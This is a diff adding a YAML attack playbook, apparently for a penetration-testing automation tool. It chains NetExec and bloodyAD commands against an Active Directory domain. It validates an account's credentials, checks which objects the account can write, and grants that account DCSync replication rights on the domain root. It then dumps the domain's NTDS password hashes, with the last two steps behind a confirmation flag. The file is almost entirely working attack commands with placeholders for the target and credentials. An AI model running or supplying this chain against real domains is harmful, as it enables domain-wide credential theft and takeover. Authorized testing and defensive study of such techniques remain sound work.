@@ -1,0 +1,17 @@
+name: ad_grant_dcsync
+description: nxc validates the actor, bloodyAD checks writable objects then grants the actor DCSync rights on the domain root, secretsdump pulls the hashes
+steps:
+  - title: Validate actor creds over LDAP
+    command: nxc ldap {{DC_IP:ip}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}}
+    continue_on_error: false
+  - title: Check whether the actor can write the domain object (needs WriteDacl / GenericAll)
+    command: bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} get writable --detail
+    continue_on_error: true
+  - title: "DANGER grant DCSync to {{USERNAME}} on the domain root (arm with: q set CONFIRM_DCSYNC 1)"
+    command: bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} add dcsync {{USERNAME}}
+    when: "CONFIRM_DCSYNC"
+    continue_on_error: false
+  - title: DCSync — dump the domain NTDS hashes with the new replication right
+    command: nxc smb {{DC_IP:ip}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} --ntds
+    when: "CONFIRM_DCSYNC"
+    continue_on_error: true
